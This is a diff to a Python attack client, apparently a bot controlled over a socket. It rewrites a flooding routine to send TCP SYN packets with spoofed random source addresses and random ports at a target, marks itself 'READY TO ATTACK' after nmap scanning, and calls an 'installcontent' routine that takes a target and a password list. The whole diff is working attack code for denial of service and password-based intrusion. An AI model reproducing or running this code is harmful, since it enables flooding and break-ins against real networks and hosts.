@@ -32,7 +32,7 @@ def generaterandomstring():
 	"""
 	This function will generate a random string
 	"""
-	return ''.join(random.choice(string.ascii_lowercase) for index in range(random.randint(0,1000)))
+	return ''.join(random.choice(string.ascii_lowercase) for index in range(random.randint(0,500)))
 
 def randombyteflooding(TARGET,DURATION):
 	"""
@@ -45,9 +45,12 @@ def randombyteflooding(TARGET,DURATION):
 		ippacket.dst = TARGET
 		ippacket.src = '.'.join(str(random.randint(0,255)) for inner in range(4))
 
-		udppacket = UDP()
+		tcppacket = TCP()
+		tcppacket.dport= random.randint(0,65535)
+		tcppacket.sport = random.randint(0,65535)
+		tcppacket.flags = 'S'
 
-		sr(ippacket/udppacket/generaterandomstring(),timeout=2)
+		send(ippacket/tcppacket/Raw(load = generaterandomstring()),verbose = 0)
 
 def installcontent(TARGET,listofpasswords):
 	"""
@@ -109,6 +112,8 @@ while True:
 			with open("log.txt", 'a') as f:
 				f.write(str(nm[parseddata[2]].all_tcp()))
 
+			STATUS = "READY TO ATTACK"
+
 	if parseddata[0] == "FLOODING":
 		if STATUS != "READY TO ATTACK":
 			s.send(STATUS)
@@ -123,7 +128,7 @@ while True:
 
 		else:
 			STATUS = "ATTACKING using malicious content"
-			print(parseddata[2].split(' '))
+			#print(parseddata[2].split(' '))
 			installcontent(parseddata[1],parseddata[2].split(' '))
 			STATUS = 'READY TO ATTACK'
 
